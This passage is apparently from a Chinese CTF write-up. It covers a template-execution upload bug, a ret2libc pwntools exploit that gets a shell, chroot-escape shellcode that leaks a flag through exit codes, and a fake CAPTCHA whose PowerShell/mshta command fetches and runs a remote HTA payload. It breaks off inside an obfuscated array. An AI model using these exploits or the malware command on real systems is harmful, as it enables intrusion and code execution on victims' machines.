+            <span class="built_in">print</span>(<span class="string">f&quot;[!] 传输失败，状态码: <span class="subst">&#123;server_resp.status_code&#125;</span>&quot;</span>)
+            <span class="built_in">print</span>(<span class="string">f&quot;[!] 服务器反馈: <span class="subst">&#123;server_resp.text[:<span class="number">300</span>]&#125;</span>&quot;</span>)
+            <span class="keyword">return</span>
+
+        <span class="built_in">print</span>(<span class="string">&quot;[+] 文件传输完成！&quot;</span>)
+        <span class="keyword">if</span> <span class="string">&quot;/view/&quot;</span> <span class="keyword">in</span> server_resp.text:
+            resource_path = server_resp.text.split(<span class="string">&quot;/view/&quot;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;&quot;&#x27;</span>)[<span class="number">0</span>]
+            base_url = target_addr.rsplit(<span class="string">&#x27;/&#x27;</span>, <span class="number">1</span>)[<span class="number">0</span>]
+            target_link = <span class="string">f&quot;<span class="subst">&#123;base_url&#125;</span>/view/<span class="subst">&#123;resource_path&#125;</span>&quot;</span>
+            <span class="built_in">print</span>(<span class="string">f&quot;[*] 正在访问资源: <span class="subst">&#123;target_link&#125;</span>&quot;</span>)
+
+            result_data = requests.get(
+                target_link,
+                timeout=<span class="number">20</span>,
+                headers=&#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0&quot;</span>&#125;
+            )
+            <span class="built_in">print</span>(<span class="string">&quot;\n[+] 操作结果:&quot;</span>)
+            <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">50</span>)
+            <span class="built_in">print</span>(result_data.text)
+            <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">50</span>)
+        <span class="keyword">else</span>:
+            <span class="built_in">print</span>(<span class="string">f&quot;[!] 未找到资源路径，反馈内容: <span class="subst">&#123;server_resp.text[:<span class="number">300</span>]&#125;</span>&quot;</span>)
+
+    <span class="keyword">except</span> Exception <span class="keyword">as</span> problem:
+        <span class="built_in">print</span>(<span class="string">f&quot;[!] 操作出现问题: <span class="subst">&#123;<span class="built_in">str</span>(problem)&#125;</span>&quot;</span>)
+
+<span class="keyword">def</span> <span class="title function_">start_operation</span>():
+    target_upload = <span class="string">&quot;http://challenge.xinshi.fun:32588/upload&quot;</span>
+    process_transfer(target_upload)
+    <span class="built_in">print</span>(<span class="string">&quot;[*] 全部操作结束&quot;</span>)
+
+<span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:
+    start_operation()</code></pre>
+
+<p>漏洞原因是用户文件被直接当模板执行，可任意运行 Python 代码</p>
+<p><img src="https://qingchenyou-1301914189.cos.ap-beijing.myqcloud.com/5c9d17cef73591c74e47d4b1d1749b75.png" alt="5c9d17cef73591c74e47d4b1d1749b75"></p>
+<h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h3><h5 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h5><p><img src="https://skymirror-1331175479.cos.ap-beijing.myqcloud.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-17%20194203.png"></p>
+<p>一眼ret2libc</p>
+<p><img src="https://skymirror-1331175479.cos.ap-beijing.myqcloud.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-17%20194325.png"></p>
+<p>无canary，无pie，只有一次输入，构造rop链，泄露puts函数地址计算libc基地址，得到system地址和 ‘&#x2F;bin&#x2F;sh’ 字符串地址，然后在第一次输入的时候最终返回到main函数进行第二次输入getshell</p>
+<p><img src="https://skymirror-1331175479.cos.ap-beijing.myqcloud.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-17%20200359.png"></p>
+<p>返回地址位0x40117c</p>
+<p><img src="https://skymirror-1331175479.cos.ap-beijing.myqcloud.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-17%20194744.png"></p>
+<p>buf溢出0x78字节</p>
+<p><img src="https://skymirror-1331175479.cos.ap-beijing.myqcloud.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-17%20194838.png"></p>
+<p>所需的gadget</p>
+<p><img src="https://skymirror-1331175479.cos.ap-beijing.myqcloud.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-17%20200640.png"></p>
+<p>中间调试发现这里卡住，第二次输入加个ret进行栈对齐</p>
+<p>将payload打过去，成功getshell</p>
+<p><img src="https://skymirror-1331175479.cos.ap-beijing.myqcloud.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-17%20231710.png"></p>
+<p><strong>Exp</strong></p>
+<pre><code class="highlight python"><span class="keyword">from</span> pwn <span class="keyword">import</span> *
+context(log_level=<span class="string">&#x27;debug&#x27;</span>)
+libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)
+elf = ELF(<span class="string">&quot;./pwn&quot;</span>)
+
+<span class="comment"># p = remote(&#x27;challenge.xinshi.fun&#x27;,43306)</span>
+p = process(<span class="string">&quot;./pwn&quot;</span>)
+
+<span class="comment"># gdb.attach(p)</span>
+<span class="comment"># pause()</span>
+
+shit = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x78</span>
+pop_rdi_ret = <span class="number">0x401176</span>
+ret = <span class="number">0x40101a</span>
+puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]
+puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]
+
+pay = flat(
+        shit,
+        p64(pop_rdi_ret),
+        p64(puts_got),
+        p64(puts_plt),
+        p64(<span class="number">0x40117c</span>)
+    )
+p.sendafter(<span class="string">b&#x27;name?\n&#x27;</span>,pay)
+
+leak = u64(p.recv()[:<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))
+libc_base = leak - libc.sym[<span class="string">&#x27;puts&#x27;</span>]
+<span class="built_in">print</span>(<span class="string">f&quot;leak = <span class="subst">&#123;<span class="built_in">hex</span>(leak)&#125;</span>&quot;</span>)
+<span class="built_in">print</span>(<span class="string">&quot;libc_base:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))
+
+system_addr = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]
+binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))
+<span class="built_in">print</span>(<span class="string">&quot;system_addr:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(system_addr)))
+<span class="built_in">print</span>(<span class="string">&quot;binsh_addr:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(binsh_addr)))
+
+payload = flat(
+        shit,
+        p64(ret),
+        p64(pop_rdi_ret),
+        p64(binsh_addr),
+        p64(system_addr)
+    )
+p.send(payload)
+
+p.interactive()</code></pre>
+
+
+
+<h5 id="The-Truman-Show"><a href="#The-Truman-Show" class="headerlink" title="The Truman Show"></a>The Truman Show</h5><p>checksec先</p>
+<p><img src="https://skymirror-1331175479.cos.ap-beijing.myqcloud.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-17%20131333.png"></p>
+<p>保护全开</p>
+<p><img src="https://skymirror-1331175479.cos.ap-beijing.myqcloud.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-17%20133425.png"></p>
+<p><img src="https://skymirror-1331175479.cos.ap-beijing.myqcloud.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-17%20133623.png"></p>
+<p>运行发现创建了一个文件夹并且放着假flag</p>
+<p>丢ida分析代码</p>
+<p><img src="https://skymirror-1331175479.cos.ap-beijing.myqcloud.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-17%20141903.png"></p>
+<p>这里将文件描述符2分配给了根目录</p>
+<p><img src="https://skymirror-1331175479.cos.ap-beijing.myqcloud.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-17%20145609.png"></p>
+<p>创建文件夹设置为根目录，并放入假的flag</p>
+<p><img src="https://skymirror-1331175479.cos.ap-beijing.myqcloud.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-17%20145801.png"></p>
+<p>分配内存并读取0x23字节长度的用户输入，进行检查后设置沙箱并执行用户输入的内容</p>
+<p>在虚拟机里用seccomp-tools查不到规则，只能分析函数了</p>
+<p><img src="https://skymirror-1331175479.cos.ap-beijing.myqcloud.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-17%20144807.png"></p>
+<p>搜索一下发现参数2147418112LL是SCMP_ACT_ALLOW，即允许</p>
+<p><img src="https://skymirror-1331175479.cos.ap-beijing.myqcloud.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-17%20144429.png"></p>
+<p><img src="https://skymirror-1331175479.cos.ap-beijing.myqcloud.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-17%20145446.png"></p>
+<p>沙箱只允许5个系统调用，0是read，257是openat，60为exit</p>
+<p>其余两个为161 chroot，83 mkdir</p>
+<p>目标就是逃出程序创建的目录，读取到真正根目录下的flag，由于文件描述符分配在chroot指令前，所以2分配给的是真的根目录，通过它进行”越狱”</p>
+<p>orw的条件不满足，要从其他方面入手</p>
+<p><img src="https://skymirror-1331175479.cos.ap-beijing.myqcloud.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-17%20150437.png"></p>
+<p>发现run.sh里有一行echo $? 代码，这行代码可以查看上一条命令的退出状态码，这个脚本应该会在远程连接到时执行，输出状态码</p>
+<p>有思路了，可以把flag内容读到栈上，再遍历每一个字节当作exit()的状态码进行泄露，只需传入一个0x23字节内的shellcode即可</p>
+<pre><code class="highlight assembly">push 0x67616c66   # ‘flag’
+
+ mov ax, 0x101    # openat(2,flag,0)
+
+ mov dil, 2
+
+ mov rsi, rsp
+
+ cdq
+
+ syscall
+
+ mov edi, eax      # read(3,rsp,0x40)
+
+ xor eax, eax
+
+ mov dl, 0x40
+
+ syscall
+
+ mov rdi, [rsp+0x0] # exit(rsp+0x0)
+
+ mov al, 60
+
+ syscall</code></pre>
+
+<p>转机器码传过去</p>
+<p><img src="https://skymirror-1331175479.cos.ap-beijing.myqcloud.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-17%20155815.png"></p>
+<p>成功泄露flag第一个字符，ascii转过来是L，然后修改mov rdi, [rsp+0x0] 中rsp的偏移，多跑几遍将flag尽数读出</p>
+<p><strong>Exp</strong></p>
+<pre><code class="highlight python"><span class="keyword">from</span> pwn <span class="keyword">import</span> *
+
+context(log_level=<span class="string">&#x27;debug&#x27;</span>)
+
+scode =(<span class="string">&quot;&quot;&quot;</span>
+<span class="string">  push 0x67616c66</span>
+<span class="string"></span>
+<span class="string">  mov ax, 0x101</span>
+<span class="string">  mov dil, 2</span>
+<span class="string">  mov rsi, rsp</span>
+<span class="string">  cdq</span>
+<span class="string">  syscall</span>
+<span class="string"></span>
+<span class="string">  mov edi, eax</span>
+<span class="string">  xor eax, eax</span>
+<span class="string">  mov dl, 0x40</span>
+<span class="string">  syscall</span>
+<span class="string"></span>
+<span class="string">  mov rdi, [rsp+0x0]</span>
+<span class="string">  mov al, 60</span>
+<span class="string">  syscall</span>
+<span class="string">&quot;&quot;&quot;</span>)
+
+mcode = asm(scode, arch=<span class="string">&#x27;amd64&#x27;</span>)
+
+<span class="keyword">assert</span> <span class="built_in">len</span>(mcode) &lt;= <span class="number">0x23</span>, <span class="string">f&quot;长度超过35字节: <span class="subst">&#123;<span class="built_in">len</span>(mcode)&#125;</span>字节&quot;</span>
+
+filtered = <span class="built_in">set</span>([<span class="number">0x80</span>, <span class="number">0x81</span>, <span class="number">0x83</span>] + <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">0x38</span>, <span class="number">0x3c</span>)))
+<span class="keyword">for</span> b <span class="keyword">in</span> mcode:
+  <span class="keyword">assert</span> b <span class="keyword">not</span> <span class="keyword">in</span> filtered, <span class="string">f&quot;包含被过滤的字符: 0x<span class="subst">&#123;b:02x&#125;</span>&quot;</span>
+ 
+<span class="comment"># p = process(&#x27;./chtest&#x27;)</span>
+p = remote(<span class="string">&#x27;challenge.xinshi.fun&#x27;</span>,<span class="number">31485</span>)
+
+p.recvuntil(<span class="string">b&#x27;time\n&#x27;</span>)
+p.send(mcode)
+
+result = p.recvall()
+<span class="built_in">print</span>(<span class="string">&quot;获取到的结果:&quot;</span>)
+<span class="built_in">print</span>(result.decode())
+
+p.close()</code></pre>
+
+
+
+<h3 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h3><h5 id="1’M-no7-A-rO6oT"><a href="#1’M-no7-A-rO6oT" class="headerlink" title="1’M no7 A rO6oT"></a>1’M no7 A rO6oT</h5><p>网站提示人机验证，需要运行复制好的东西，开虚拟机运行试试</p>
+<pre><code class="highlight plaintext">powershell . \*i*\\\\\\\\\\\\\\\*2\msh*e http://challenge.xinshi.fun:31833/Coloringoutomic_Host.mp3   http://challenge.xinshi.fun:31833/Coloringoutomic_Host.mp3 #     ✅ Ι am nοt a rοbοt: CAPTCHA Verification ID: 10086</code></pre>
+
+<p>运行后，发现是会执行恶意程序</p>
+<p>分析运行的代码可以知道运行了hta文件</p>
+<p>首先到url地址去下载这个mp3，里面肯定有东西</p>
+<p>使用文本格式打开，发现里面有脚本，提取一下</p>
+<p><img src="https://qingchenyou-1301914189.cos.ap-beijing.myqcloud.com/image-20250816173207651.png" alt="image-20250816173207651"></p>
+<p>提取后删掉对window的操控代码得到脚本主体</p>
+<p>修改eval变为console.log，把内容以日志形式输出</p>
+<p><img src="https://qingchenyou-1301914189.cos.ap-beijing.myqcloud.com/image-20250816173320442.png" alt="image-20250816173320442"></p>
+<p>得到一段js代码</p>
+<p><img src="https://qingchenyou-1301914189.cos.ap-beijing.myqcloud.com/image-20250816173342357.png" alt="image-20250816173342357"></p>
+<p>里面有一长串的数组，解密一下</p>
+<pre><code class="highlight javascript"><span class="keyword">const</span> cmdArr = [<span class="number">713</span>, <span class="number">712</span>, <span class="number">720</span>, <span class="number">702</span>, <span class="number">715</span>, <span class="number">716</span>, <span class="number">705</span>, <span class="number">702</span>, <span class="number">709</span>, <span class="number">709</span>, <span class="number">647</span>, <span class="number">702</span>, <span class="number">721</span>, <span class="number">702</span>, <span class="number">633</span>, <span class="number">646</span>, <span class="number">720</span>, <span class="number">633</span>, <span class="number">650</span>, <span class="number">633</span>, <span class="number">646</span>, <span class="number">702</span>, <span class="number">713</span>, <span class="number">633</span>, <span class="number">686</span>, <span class="number">711</span>, <span class="number">715</span>, <span class="number">702</span>, <span class="number">716</span>, <span class="number">717</span>, <span class="number">715</span>, <span class="number">706</span>, <span class="number">700</span>, <span class="number">717</span>, <span class="number">702</span>, <span class="number">701</span>, <span class="number">633</span>, <span class="number">646</span>, <span class="number">711</span>, <span class="number">712</span>, <span class="number">713</span>, <span class="number">633</span>, <span class="number">637</span>, <span class="number">670</span>, <span class="number">671</span>, <span class="number">685</span>, <span class="number">670</span>, <span class="number">633</span>, <span class="number">662</span>, <span class="number">641</span>, <span class="number">692</span>, <span class="number">715</span>, <span class="number">702</span>, <span class="number">704</span>, <span class="number">702</span>, <span class="number">721</span>, <span class="number">694</span>, <span class="number">659</span>, <span class="number">659</span>, <span class="number">678</span>, <span class="number">698</span>, <span class="number">717</span>, <span class="number">700</span>, <span class="number">705</span>, <span class="number">702</span>, <span class="number">716</span>, <span class="number">641</span>, <span class="number">640</span>, <span class="number">698</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">653</span>, <span class="number">658</span>, <span class="number">703</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">702</span>, <span class="number">650</span>, <span class="number">658</span>, <span class="number">700</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">652</span>, <span class="number">698</span>, <span class="number">703</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">703</span>, <span class="number">699</span>, <span class="number">703</span>, <span class="number">702</span>, <span class="number">700</span>, <span class="number">702</span>, <span class="number">702</span>, <span class="number">702</span>, <span class="number">657</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">699</span>, <span class="number">698</span>, <span class="number">703</span>, <span class="number">655</span>, <span class="number">658</span>, <span class="number">703</span>, <span class="number">699</span>, <span class="number">654</span>, <span class="number">699</span>, <span class="number">703</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">650</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">652</span>, <span class="number">698</span>, <span class="number">652</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">658</span>, <span class="number">649</span>, <span class="number">658</span>, <span class="number">703</span>, <span class="number">699</span>, <span class="number">654</span>, <span class="number">699</span>, <span class="number">703</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">652</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">703</span>, <span class="number">698</span>, <span class="number">703</span>, <span class="number">657</span>, <span class="number">658</span>, <span class="number">649</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">698</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">698</span>, <span class="number">657</span>, <span class="number">698</span>, <span class="number">652</span>, <span class="number">699</span>, <span class="number">699</span>, <span class="number">699</span>, <span class="number">703</span>, <span class="number">658</span>, <span class="number">700</span>, <span class="number">698</span>, <span class="number">652</span>, <span class="number">699</span>, <span class="number">699</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">658</span>, <span class="number">703</span>, <span class="number">698</span>, <span class="number">653</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">649</span>, <span class="number">698</span>, <span class="number">649</span>, <span class="number">658</span>, <span class="number">649</span>, <span class="number">699</span>, <span class="number">698</span>, <span class="number">703</span>, <span class="number">701</span>, <span class="number">702</span>, <span class="number">651</span>, <span class="number">703</span>, <span class="number">700</span>, <span class="number">658</span>, <span class="number">649</span>, <span class="number">699</span>, <span class="number">700</span>, <span class="number">698</span>, <span class="number">652</span>, <span class="number">699</span>, <span class="number">699</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">699</span>, <span class="number">703</span>, <span class="number">698</span>, <span class="number">653</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">649</span>, <span class="number">698</span>, <span class="number">649</span>, <span class="number">702</span>, <span class="number">651</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">653</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">702</span>, <span class="number">702</span>, <span class="number">700</span>, <span class="number">702</span>, <span class="number">650</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">698</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">698</span>, <span class="number">657</span>, <span class="number">698</span>, <span class="number">652</span>, <span class="number">699</span>, <span class="number">699</span>, <span class="number">658</span>, <span class="number">703</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">699</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">649</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">700</span>, <span class="number">657</span>, <span class="number">653</span>, <span class="number">698</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">657</span>, <span class="number">698</span>, <span class="number">657</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">702</span>, <span class="number">700</span>, <span class="number">702</span>, <span class="number">650</span>, <span class="number">657</span>, <span class="number">701</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">699</span>, <span class="number">699</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">657</span>, <span class="number">649</span>, <span class="number">698</span>, <span class="number">654</span>, <span class="number">699</span>, <span class="number">703</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">702</span>, <span class="number">700</span>, <span class="number">702</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">650</span>, <span class="number">699</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">649</span>, <span class="number">702</span>, <span class="number">699</span>, <span class="number">698</span>, <span class="number">653</span>, <span class="number">702</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">649</span>, <span class="number">702</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">700</span>, <span class="number">702</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">649</span>, <span class="number">702</span>, <span class="number">699</span>, <span class="number">658</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">703</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">703</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">657</span>, <span class="number">702</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">649</span>, <span class="number">702</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">650</span>, <span class="number">657</span>, <span class="number">703</span>, <span class="number">698</span>, <span class="number">652</span>, <span class="number">698</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">698</span>, <span class="number">657</span>, <span class="number">702</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">649</span>, <span class="number">702</span>, <span class="number">702</span>, <span class="number">658</span>, <span class="number">703</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">702</span>, <span class="number">650</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">649</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">700</span>, <span class="number">703</span>, <span class="number">703</span>, <span class="number">702</span>, <span class="number">700</span>, <span class="number">702</span>, <span class="number">699</span>, <span class="number">698</span>, <span class="number">653</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">699</span>, <span class="number">700</span>, <span class="number">703</span>, <span class="number">655</span>, <span class="number">702</span>, <span class="number">652</span>, <span class="number">702</span>, <span class="number">652</span>, <span class="number">698</span>, <span class="number">703</span>, <span class="number">698</span>, <span class="number">653</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">649</span>, <span class="number">698</span>, <span class="number">649</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">698</span>, <span class="number">699</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">651</span>, <span class="number">699</span>, <span class="number">653</span>, <span class="number">698</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">699</span>, <span class="number">703</span>, <span class="number">698</span>, <span class="number">653</span>, <span class="number">698</span>, <span class="number">654</span>, <span class="number">702</span>, <span class="number">651</span>, <span class="number">698</span>, <span class="number">698</span>, <span class="number">699</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">703</span>, <span class="number">655</span>, <span class="number">703</span>, <span class="number">703</span>, <span class="number">703</span>, <span class="number">701</span>, <span class="number">703</span>, <span class="number">653</span>, <span class="number">703</span>, <span class="number">703</span>, <span class="number">703</span>, <span class="number">703</span>, <span class="number">702</span>, <span class="number">652</span>, <span class="number">698</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">703</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">699</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">657</span>, <span class="number">698</span>, <span class="number">657</span>, <span class="number">698</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">698</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">651</span>, <span class="number">698</span>, <span class="number">655</span>, <span class="number">699</span>, <span class="number">700</span>, <span class="number">698</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">699</span>, <span class="number">703</span>, <span class="number">656</span>, <span class="number">658</span>, <span class="number">703</span>, <span class="number">657</span>, <span class="number">654</span>, <span class="number">702</span>, <span class="number">700</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">649</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">703</span>, <span class="number">655</span>, <span class="number">702</span>, <span class="number">652</span>, <span class="number">658</span>, <span class="number">655</span>, <span class="number">703</span>, <span class="number">657</span>, <span class="number">657</span>, <span class="number">657</span>, <span class="number">702</span>, <span class="number">700</span>, <span class="number">702</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">651</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">702</span>, <span class="number">651</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">702</span>, <span class="number">657</span>, <span class="number">703</span>, <span class="number">698</span>, <span class="number">649</span>, <span class="number">698</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">702</span>, <span class="number">699</span>, <span class="number">703</span>, <span class="number">656</span>, <span class="number">698</span>, <span class="number">703</span>, <span class="number">698</span>, <span class="number">657</span>, <span class="number">703</span>, <span class="number">656</span>, <span class="number">658</span>, <span class="number">703</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">702</span>, <span class="number">700</span>, <span class="number">698</span>, <span class="number">703</span>, <span class="number">703</span>, <span class="number">657</span>, <span class="number">657</span>, <span class="number">653</span>, <span class="number">702</span>, <span class="number">700</span>, <span class="number">702</span>, <span class="number">653</span>, <span class="number">702</span>, <span class="number">651</span>, <span class="number">698</span>, <span class="number">700</span>, <span class="number">702</span>, <span class="number">657</span>, <span class="number">657</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">653</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">703</span>, <span class="number">699</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">698</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">652</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">657</span>, <span class="number">703</span>, <span class="number">698</span>, <span class="number">652</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">653</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">702</span>, <span class="number">651</span>, <span class="number">657</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">699</span>, <span class="number">698</span>, <span class="number">698</span>, <span class="number">652</span>, <span class="number">698</span>, <span class="number">656</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">657</span>, <span class="number">703</span>, <span class="number">698</span>, <span class="number">652</span>, <span class="number">698</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">698</span>, <span class="number">657</span>, <span class="number">702</span>, <span class="number">651</span>, <span class="number">702</span>, <span class="number">653</span>, <span class="number">702</span>, <span class="number">653</span>, <span class="number">698</span>, <span class="number">700</span>, <span class="number">702</span>, <span class="number">657</span>, <span class="number">657</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">653</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">703</span>, <span class="number">699</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">698</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">652</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">657</span>, <span class="number">703</span>, <span class="number">698</span>, <span class="number">652</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">653</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">702</span>, <span 